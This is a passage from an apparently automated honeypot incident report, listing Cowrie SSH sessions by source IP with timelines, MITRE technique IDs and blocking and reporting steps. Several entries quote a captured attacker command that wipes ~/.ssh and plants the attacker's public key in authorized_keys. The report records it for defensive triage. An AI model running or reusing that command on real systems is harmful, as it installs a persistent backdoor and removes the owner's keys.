| `2026-06-12 14:13:37` | `cowrie.login.success` |
| `2026-06-12 14:13:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.99.99[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.99.99[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8775c3e0a8f8

| Field | Detail |
|---|---|
| **Source IP** | `122.35.192[.]61` |
| **First Seen** | 2026-06-12 14:13 |
| **Last Seen** | 2026-06-12 14:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:13:54` | `cowrie.session.connect` |
| `2026-06-12 14:13:54` | `cowrie.client.version` |
| `2026-06-12 14:13:54` | `cowrie.client.kex` |
| `2026-06-12 14:13:54` | `cowrie.login.success` |
| `2026-06-12 14:13:55` | `cowrie.session.params` |
| `2026-06-12 14:13:55` | `cowrie.command.input` |
| `2026-06-12 14:13:55` | `cowrie.command.failed` |
| `2026-06-12 14:13:55` | `cowrie.log.closed` |
| `2026-06-12 14:13:55` | `cowrie.session.params` |
| `2026-06-12 14:13:55` | `cowrie.command.input` |
| `2026-06-12 14:13:55` | `cowrie.session.file_download` |
| `2026-06-12 14:13:55` | `cowrie.log.closed` |
| `2026-06-12 14:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.35.192[.]61` to AbuseIPDB if not already reported
- [ ] Block `122.35.192[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e74ce4a997d8

| Field | Detail |
|---|---|
| **Source IP** | `122.35.192[.]61` |
| **First Seen** | 2026-06-12 14:13 |
| **Last Seen** | 2026-06-12 14:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:13:57` | `cowrie.session.connect` |
| `2026-06-12 14:13:57` | `cowrie.client.version` |
| `2026-06-12 14:13:58` | `cowrie.client.kex` |
| `2026-06-12 14:13:58` | `cowrie.login.success` |
| `2026-06-12 14:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.35.192[.]61` to AbuseIPDB if not already reported
- [ ] Block `122.35.192[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5257742e89c4

| Field | Detail |
|---|---|
| **Source IP** | `183.82.120[.]244` |
| **First Seen** | 2026-06-12 14:14 |
| **Last Seen** | 2026-06-12 14:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:14:05` | `cowrie.session.connect` |
| `2026-06-12 14:14:05` | `cowrie.client.version` |
| `2026-06-12 14:14:05` | `cowrie.client.kex` |
| `2026-06-12 14:14:05` | `cowrie.login.success` |
| `2026-06-12 14:14:05` | `cowrie.session.params` |
| `2026-06-12 14:14:05` | `cowrie.command.input` |
| `2026-06-12 14:14:05` | `cowrie.command.failed` |
| `2026-06-12 14:14:05` | `cowrie.log.closed` |
| `2026-06-12 14:14:05` | `cowrie.session.params` |
| `2026-06-12 14:14:05` | `cowrie.command.input` |
| `2026-06-12 14:14:05` | `cowrie.session.file_download` |
| `2026-06-12 14:14:05` | `cowrie.log.closed` |
| `2026-06-12 14:14:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.120[.]244` to AbuseIPDB if not already reported
- [ ] Block `183.82.120[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b288a2f8548

| Field | Detail |
|---|---|
| **Source IP** | `183.82.120[.]244` |
| **First Seen** | 2026-06-12 14:14 |
| **Last Seen** | 2026-06-12 14:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:14:06` | `cowrie.session.connect` |
| `2026-06-12 14:14:06` | `cowrie.client.version` |
| `2026-06-12 14:14:06` | `cowrie.client.kex` |
| `2026-06-12 14:14:06` | `cowrie.login.success` |
| `2026-06-12 14:14:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.120[.]244` to AbuseIPDB if not already reported
- [ ] Block `183.82.120[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c699aadd3188

| Field | Detail |
|---|---|
| **Source IP** | `98.26.115[.]52` |
| **First Seen** | 2026-06-12 14:15 |
| **Last Seen** | 2026-06-12 14:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:15:28` | `cowrie.session.connect` |
| `2026-06-12 14:15:28` | `cowrie.client.version` |
| `2026-06-12 14:15:28` | `cowrie.client.kex` |
| `2026-06-12 14:15:29` | `cowrie.login.success` |
| `2026-06-12 14:15:30` | `cowrie.session.params` |
| `2026-06-12 14:15:30` | `cowrie.command.input` |
| `2026-06-12 14:15:30` | `cowrie.command.failed` |
| `2026-06-12 14:15:30` | `cowrie.log.closed` |
| `2026-06-12 14:15:30` | `cowrie.session.params` |
| `2026-06-12 14:15:30` | `cowrie.command.input` |
| `2026-06-12 14:15:31` | `cowrie.session.file_download` |
| `2026-06-12 14:15:31` | `cowrie.log.closed` |
| `2026-06-12 14:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.26.115[.]52` to AbuseIPDB if not already reported
- [ ] Block `98.26.115[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f2847aa0e5f

| Field | Detail |
|---|---|
| **Source IP** | `98.26.115[.]52` |
| **First Seen** | 2026-06-12 14:15 |
| **Last Seen** | 2026-06-12 14:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:15:34` | `cowrie.session.connect` |
| `2026-06-12 14:15:34` | `cowrie.client.version` |
| `2026-06-12 14:15:34` | `cowrie.client.kex` |
| `2026-06-12 14:15:35` | `cowrie.login.success` |
| `2026-06-12 14:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.26.115[.]52` to AbuseIPDB if not already reported
- [ ] Block `98.26.115[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab01d1f2d4ca

| Field | Detail |
|---|---|
| **Source IP** | `185.99.99[.]95` |
| **First Seen** | 2026-06-12 14:16 |
| **Last Seen** | 2026-06-12 14:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:16:02` | `cowrie.session.connect` |
| `2026-06-12 14:16:02` | `cowrie.client.version` |
| `2026-06-12 14:16:02` | `cowrie.client.kex` |
| `2026-06-12 14:16:03` | `cowrie.login.success` |
| `2026-06-12 14:16:03` | `cowrie.session.params` |
| `2026-06-12 14:16:03` | `cowrie.command.input` |
| `2026-06-12 14:16:03` | `cowrie.command.failed` |
| `2026-06-12 14:16:04` | `cowrie.log.closed` |
| `2026-06-12 14:16:04` | `cowrie.session.params` |
| `2026-06-12 14:16:04` | `cowrie.command.input` |
| `2026-06-12 14:16:04` | `cowrie.session.file_download` |
| `2026-06-12 14:16:04` | `cowrie.log.closed` |
| `2026-06-12 14:16:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.99.99[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.99.99[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-384208669892

| Field | Detail |
|---|---|
| **Source IP** | `185.99.99[.]95` |
| **First Seen** | 2026-06-12 14:16 |
| **Last Seen** | 2026-06-12 14:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:16:07` | `cowrie.session.connect` |
| `2026-06-12 14:16:07` | `cowrie.client.version` |
| `2026-06-12 14:16:07` | `cowrie.client.kex` |
| `2026-06-12 14:16:08` | `cowrie.login.success` |
| `2026-06-12 14:16:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.99.99[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.99.99[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdef15fff02d

| Field | Detail |
|---|---|
| **Source IP** | `103.151.140[.]79` |
| **First Seen** | 2026-06-12 14:16 |
| **Last Seen** | 2026-06-12 14:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:16:31` | `cowrie.session.connect` |
| `2026-06-12 14:16:31` | `cowrie.client.version` |
| `2026-06-12 14:16:31` | `cowrie.client.kex` |
| `2026-06-12 14:16:31` | `cowrie.login.success` |
| `2026-06-12 14:16:32` | `cowrie.session.params` |
| `2026-06-12 14:16:32` | `cowrie.command.input` |
| `2026-06-12 14:16:32` | `cowrie.command.failed` |
| `2026-06-12 14:16:32` | `cowrie.log.closed` |
| `2026-06-12 14:16:32` | `cowrie.session.params` |
| `2026-06-12 14:16:32` | `cowrie.command.input` |
| `2026-06-12 14:16:32` | `cowrie.session.file_download` |
| `2026-06-12 14:16:32` | `cowrie.log.closed` |
| `2026-06-12 14:16:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.151.140[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.151.140[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47e939ef25ec

| Field | Detail |
|---|---|
| **Source IP** | `103.151.140[.]79` |
| **First Seen** | 2026-06-12 14:16 |
| **Last Seen** | 2026-06-12 14:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:16:33` | `cowrie.session.connect` |
| `2026-06-12 14:16:33` | `cowrie.client.version` |
| `2026-06-12 14:16:33` | `cowrie.client.kex` |
| `2026-06-12 14:16:34` | `cowrie.login.success` |
| `2026-06-12 14:16:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.151.140[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.151.140[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65b297af8019

| Field | Detail |
|---|---|
| **Source IP** | `183.82.120[.]244` |
| **First Seen** | 2026-06-12 14:16 |
| **Last Seen** | 2026-06-12 14:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:16:40` | `cowrie.session.connect` |
| `2026-06-12 14:16:40` | `cowrie.client.version` |
| `2026-06-12 14:16:40` | `cowrie.client.kex` |
| `2026-06-12 14:16:40` | `cowrie.login.success` |
| `2026-06-12 14:16:40` | `cowrie.session.params` |
| `2026-06-12 14:16:40` | `cowrie.command.input` |
| `2026-06-12 14:16:40` | `cowrie.command.failed` |
| `2026-06-12 14:16:40` | `cowrie.log.closed` |
| `2026-06-12 14:16:40` | `cowrie.session.params` |
| `2026-06-12 14:16:40` | `cowrie.command.input` |
| `2026-06-12 14:16:40` | `cowrie.session.file_download` |
| `2026-06-12 14:16:40` | `cowrie.log.closed` |
| `2026-06-12 14:16:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.120[.]244` to AbuseIPDB if not already reported
- [ ] Block `183.82.120[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-631e09fb298e

| Field | Detail |
|---|---|
| **Source IP** | `183.82.120[.]244` |
| **First Seen** | 2026-06-12 14:16 |
| **Last Seen** | 2026-06-12 14:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:16:42` | `cowrie.session.connect` |
| `2026-06-12 14:16:42` | `cowrie.client.version` |
| `2026-06-12 14:16:42` | `cowrie.client.kex` |
| `2026-06-12 14:16:42` | `cowrie.login.success` |
| `2026-06-12 14:16:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.120[.]244` to AbuseIPDB if not already reported
- [ ] Block `183.82.120[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40f983d68838

| Field | Detail |
|---|---|
| **Source IP** | `89.117.50[.]180` |
| **First Seen** | 2026-06-12 14:17 |
| **Last Seen** | 2026-06-12 14:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:17:44` | `cowrie.session.connect` |
| `2026-06-12 14:17:44` | `cowrie.client.version` |
| `2026-06-12 14:17:44` | `cowrie.client.kex` |
| `2026-06-12 14:17:44` | `cowrie.login.success` |
| `2026-06-12 14:17:44` | `cowrie.session.params` |
| `2026-06-12 14:17:44` | `cowrie.command.input` |
| `2026-06-12 14:17:44` | `cowrie.command.failed` |
| `2026-06-12 14:17:45` | `cowrie.log.closed` |
| `2026-06-12 14:17:45` | `cowrie.session.params` |
| `2026-06-12 14:17:45` | `cowrie.command.input` |
| `2026-06-12 14:17:45` | `cowrie.session.file_download` |
| `2026-06-12 14:17:45` | `cowrie.log.closed` |
| `2026-06-12 14:17:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.117.50[.]180` to AbuseIPDB if not already reported
- [ ] Block `89.117.50[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c266d62fe20

| Field | Detail |
|---|---|
| **Source IP** | `89.117.50[.]180` |
| **First Seen** | 2026-06-12 14:17 |
| **Last Seen** | 2026-06-12 14:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:17:47` | `cowrie.session.connect` |
| `2026-06-12 14:17:47` | `cowrie.client.version` |
| `2026-06-12 14:17:48` | `cowrie.client.kex` |
| `2026-06-12 14:17:48` | `cowrie.login.success` |
| `2026-06-12 14:17:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.117.50[.]180` to AbuseIPDB if not already reported
- [ ] Block `89.117.50[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a2a845c1e38

| Field | Detail |
|---|---|
| **Source IP** | `185.99.99[.]95` |
| **First Seen** | 2026-06-12 14:18 |
| **Last Seen** | 2026-06-12 14:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:18:45` | `cowrie.session.connect` |
| `2026-06-12 14:18:45` | `cowrie.client.version` |
| `2026-06-12 14:18:45` | `cowrie.client.kex` |
| `2026-06-12 14:18:46` | `cowrie.login.success` |
| `2026-06-12 14:18:46` | `cowrie.session.params` |
| `2026-06-12 14:18:46` | `cowrie.command.input` |
| `2026-06-12 14:18:46` | `cowrie.command.failed` |
| `2026-06-12 14:18:46` | `cowrie.log.closed` |
| `2026-06-12 14:18:47` | `cowrie.session.params` |
| `2026-06-12 14:18:47` | `cowrie.command.input` |
| `2026-06-12 14:18:47` | `cowrie.session.file_download` |
| `2026-06-12 14:18:47` | `cowrie.log.closed` |
| `2026-06-12 14:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.99.99[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.99.99[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-937a668fe510

| Field | Detail |
|---|---|
| **Source IP** | `185.99.99[.]95` |
| **First Seen** | 2026-06-12 14:18 |
| **Last Seen** | 2026-06-12 14:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:18:49` | `cowrie.session.connect` |
| `2026-06-12 14:18:49` | `cowrie.client.version` |
| `2026-06-12 14:18:49` | `cowrie.client.kex` |
| `2026-06-12 14:18:50` | `cowrie.login.success` |
| `2026-06-12 14:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.99.99[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.99.99[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23caa14f82ed

| Field | Detail |
|---|---|
| **Source IP** | `89.117.50[.]180` |
| **First Seen** | 2026-06-12 14:20 |
| **Last Seen** | 2026-06-12 14:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
